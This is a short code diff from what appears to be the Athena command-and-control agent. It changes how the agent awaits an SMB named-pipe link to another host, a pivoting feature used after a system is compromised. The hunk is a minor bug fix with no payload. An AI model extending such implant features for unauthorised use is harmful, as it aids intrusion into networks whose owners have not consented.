@@ -150,7 +150,7 @@ namespace Athena.Commands
                         Dictionary<string, string> par = JsonConvert.DeserializeObject<Dictionary<string, string>>(job.task.parameters);
                         if (par.ContainsKey("hostname") && par.ContainsKey("pipename"))
                         {
-                            if (Globals.mc.MythicConfig.smbForwarder.Link(par["hostname"], par["pipename"]))
+                            if (Globals.mc.MythicConfig.smbForwarder.Link(par["hostname"], par["pipename"]).Result)
                             {
                                 completeJob(ref job, "Link established.", false);
                             }
